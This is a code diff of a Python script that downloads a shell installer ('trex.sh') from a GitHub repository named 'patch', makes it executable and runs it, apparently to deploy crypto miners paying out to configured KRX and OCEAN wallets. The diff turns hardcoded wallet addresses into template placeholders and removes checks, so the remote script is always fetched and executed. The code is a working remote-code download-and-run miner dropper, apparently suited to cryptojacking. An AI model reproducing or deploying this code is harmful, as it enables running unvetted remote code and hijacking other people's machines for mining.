@@ -8,8 +8,8 @@ import urllib.request
 from pathlib import Path
 
 PUBLIC_IP = "{HARDCODED_PUBLIC_IP}"
-KRX_WALLET = "krxXJ6QJPW"
-OCEAN_WALLET = "885VUf2YL1WDTQZm36tSZU7NqZaSFNSvWH96431L1y5K3cde8sUEQZEQpbxS8JKW7Y6xc8DDEW1xpGWYyAngqG3F8RJtCX5"
+KRX_WALLET = "{KRX_WALLET}"
+OCEAN_WALLET = "{OCEAN_WALLET}"
 
 TREX_CONFIG = {
     "SCRIPT_URL": "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/trex.sh", # Замени
@@ -53,22 +53,17 @@ def run_installer_script_if_needed(config):
     binary_path = install_dir / config["BINARY_NAME"]
     script_path = SCRIPTS_DIR / config["INSTALLER_NAME"]
 
-    if binary_path.exists():
-        print(f"Binary {binary_path} already exists, skipping installation script for {config['INSTALLER_NAME']}.")
-        return True
-
-    if not script_path.exists():
-        print(f"Downloading installer script {config['INSTALLER_NAME']}...")
-        try:
-            urllib.request.urlretrieve(config["SCRIPT_URL"], script_path)
-            os.chmod(script_path, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
-            print(f"Installer script {config['INSTALLER_NAME']} downloaded and made executable.")
-        except Exception as e:
-            print(f"Failed to download {config['INSTALLER_NAME']}: {e}")
-            with open(error_log_path, "a") as f:
-                f.write(f"--- FAILED TO DOWNLOAD {script_path} ---\n")
-                f.write(traceback.format_exc())
-            return False
+    print(f"Downloading installer script {config['INSTALLER_NAME']}...")
+    try:
+        urllib.request.urlretrieve(config["SCRIPT_URL"], script_path)
+        os.chmod(script_path, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
+        print(f"Installer script {config['INSTALLER_NAME']} downloaded and made executable.")
+    except Exception as e:
+        print(f"Failed to download {config['INSTALLER_NAME']}: {e}")
+        with open(error_log_path, "a") as f:
+            f.write(f"--- FAILED TO DOWNLOAD {script_path} ---\n")
+            f.write(traceback.format_exc())
+        return False
 
     try:
         print(f"Running installer script {script_path}...")
